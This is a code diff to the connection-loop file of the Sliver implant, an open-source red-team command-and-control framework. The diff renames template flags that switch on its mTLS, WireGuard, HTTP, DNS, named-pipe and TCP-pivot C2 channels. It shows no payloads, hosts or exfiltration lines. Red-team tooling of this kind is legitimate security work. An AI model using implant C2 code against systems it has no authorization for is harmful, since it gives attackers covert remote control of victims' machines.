@@ -19,12 +19,12 @@ package transports
 */
 
 import (
-	// {{if or .Config.IncludeWG .Config.IncludeHTTP}}
+	// {{if or .Config.WGc2Enabled .Config.HTTPc2Enabled}}
 	"net"
 
 	// {{end}}
 
-	// {{if or .Config.IncludeMTLS .Config.IncludeWG}}
+	// {{if or .Config.MTLSc2Enabled .Config.WGc2Enabled}}
 	"strconv"
 	// {{end}}
 
@@ -32,14 +32,14 @@ import (
 	"log"
 	// {{end}}
 
-	// {{if .Config.IncludeMTLS}}
+	// {{if .Config.MTLSc2Enabled}}
 	"crypto/tls"
 
 	"github.com/bishopfox/sliver/implant/sliver/transports/mtls"
 
 	// {{end}}
 
-	// {{if .Config.IncludeWG}}
+	// {{if .Config.WGc2Enabled}}
 	"errors"
 
 	"github.com/bishopfox/sliver/implant/sliver/transports/wireguard"
@@ -47,21 +47,21 @@ import (
 
 	// {{end}}
 
-	// {{if .Config.IncludeHTTP}}
+	// {{if .Config.HTTPc2Enabled}}
 	"github.com/bishopfox/sliver/implant/sliver/transports/httpclient"
 	// {{end}}
 
-	// {{if .Config.IncludeDNS}}
+	// {{if .Config.DNSc2Enabled}}
 	"github.com/bishopfox/sliver/implant/sliver/transports/dnsclient"
 	// {{end}}
 
-	// {{if .Config.IncludeTCP}}
+	// {{if .Config.TCPPivotc2Enabled}}
 	"github.com/bishopfox/sliver/implant/sliver/transports/pivotclients"
 	"google.golang.org/protobuf/proto"
 
 	// {{end}}
 
-	// {{if not .Config.IncludeNamePipe}}
+	// {{if not .Config.NamePipec2Enabled}}
 	"io"
 	"net/url"
 	"sync"
@@ -106,7 +106,7 @@ func StartConnectionLoop(abort <-chan struct{}, temporaryC2 ...string) <-chan *C
 			switch uri.Scheme {
 
 			// *** MTLS ***
-			// {{if .Config.IncludeMTLS}}
+			// {{if .Config.MTLSc2Enabled}}
 			case "mtls":
 				connection, err = mtlsConnect(uri)
 				if err != nil {
@@ -115,10 +115,10 @@ func StartConnectionLoop(abort <-chan struct{}, temporaryC2 ...string) <-chan *C
 					// {{end}}
 					continue
 				}
-				// {{end}}  - IncludeMTLS
+				// {{end}}  - MTLSc2Enabled
 			case "wg":
 				// *** WG ***
-				// {{if .Config.IncludeWG}}
+				// {{if .Config.WGc2Enabled}}
 				connection, err = wgConnect(uri)
 				if err != nil {
 					// {{if .Config.Debug}}
@@ -126,12 +126,12 @@ func StartConnectionLoop(abort <-chan struct{}, temporaryC2 ...string) <-chan *C
 					// {{end}}
 					continue
 				}
-				// {{end}}  - IncludeWG
+				// {{end}}  - WGc2Enabled
 			case "https":
 				fallthrough
 			case "http":
 				// *** HTTP ***
-				// {{if .Config.IncludeHTTP}}
+				// {{if .Config.HTTPc2Enabled}}
 				connection, err = httpConnect(uri)
 				if err != nil {
 					// {{if .Config.Debug}}
@@ -139,11 +139,11 @@ func StartConnectionLoop(abort <-chan struct{}, temporaryC2 ...string) <-chan *C
 					// {{end}}
 					continue
 				}
-				// {{end}} - IncludeHTTP
+				// {{end}} - HTTPc2Enabled
 
 			case "dns":
 				// *** DNS ***
-				// {{if .Config.IncludeDNS}}
+				// {{if .Config.DNSc2Enabled}}
 				connection, err = dnsConnect(uri)
 				if err != nil {
 					// {{if .Config.Debug}}
@@ -151,11 +151,11 @@ func StartConnectionLoop(abort <-chan struct{}, temporaryC2 ...string) <-chan *C
 					// {{end}}
 					continue
 				}
-				// {{end}} - IncludeDNS
+				// {{end}} - DNSc2Enabled
 
 			case "namedpipe":
 				// *** Named Pipe ***
-				// {{if .Config.IncludeNamePipe}}
+				// {{if .Config.NamePipec2Enabled}}
 				connection, err = namedPipeConnect(uri)
 				if err != nil {
 					// {{if .Config.Debug}}
@@ -163,10 +163,10 @@ func StartConnectionLoop(abort <-chan struct{}, temporaryC2 ...string) <-chan *C
 					// {{end}}
 					continue
 				}
-				// {{end}} -IncludeNamePipe
+				// {{end}} -NamePipec2Enabled
 
 			case "tcppivot":
-				// {{if .Config.IncludeTCP}}
+				// {{if .Config.TCPPivotc2Enabled}}
 				connection, err = tcpPivotConnect(uri)
 				if err != nil {
 					// {{if .Config.Debug}}
@@ -174,7 +174,7 @@ func StartConnectionLoop(abort <-chan struct{}, temporaryC2 ...string) <-chan *C
 					// {{end}}
 					continue
 				}
-				// {{end}} -IncludeTCP
+				// {{end}} -TCPPivotc2Enabled
 
 			default:
 				// {{if .Config.Debug}}
@@ -192,7 +192,7 @@ func StartConnectionLoop(abort <-chan struct{}, temporaryC2 ...string) <-chan *C
 	return nextConnection
 }
 
-// {{if .Config.IncludeMTLS}}
+// {{if .Config.MTLSc2Enabled}}
 func mtlsConnect(uri *url.URL) (*Connection, error) {
 
 	send := make(chan *pb.Envelope)
@@ -291,9 +291,9 @@ func mtlsConnect(uri *url.URL) (*Connection, error) {
 	return connection, nil
 }
 
-// {{end}} -IncludeMTLS
+// {{end}} -MTLSc2Enabled
 
-// {{if .Config.IncludeWG}}
+// {{if .Config.WGc2Enabled}}
 func wgConnect(uri *url.URL) (*Connection, error) {
 
 	send := make(chan *pb.Envelope)
@@ -403,9 +403,9 @@ func wgConnect(uri *url.URL) (*Connection, error) {
 	return connection, nil
 }
 
-// {{end}} -IncludeWG
+// {{end}} -WGc2Enabled
 
-// {{if .Config.IncludeHTTP}}
+// {{if .Config.HTTPc2Enabled}}
 func httpConnect(uri *url.URL) (*Connection, error) {
 	send := make(chan *pb.Envelope)
 	recv := make(chan *pb.Envelope)
@@ -524,9 +524,9 @@ func httpConnect(uri *url.URL) (*Connection, error) {
 	return connection, nil
 }
 
-// {{end}} -IncludeHTTP
+// {{end}} -HTTPc2Enabled
 
-// {{if .Config.IncludeDNS}}
+// {{if .Config.DNSc2Enabled}}
 func dnsConnect(uri *url.URL) (*Connection, error) {
 	send := make(chan *pb.Envelope)
 	recv := make(chan *pb.Envelope)
@@ -631,9 +631,9 @@ func dnsConnect(uri *url.URL) (*Connection, error) {
 	return connection, nil
 }
 
-// {{end}} - .IncludeDNS
+// {{end}} - .DNSc2Enabled
 
-// {{if .Config.IncludeTCP}}
+// {{if .Config.TCPPivotc2Enabled}}
 func tcpPivotConnect(uri *url.URL) (*Connection, error) {
 
 	send := make(chan *pb.Envelope)
@@ -764,4 +764,4 @@ func tcpPivotConnect(uri *url.URL) (*Connection, error) {
 	return connection, nil
 }
 
-// {{end}} -IncludeTCP
+// {{end}} -TCPPivotc2Enabled
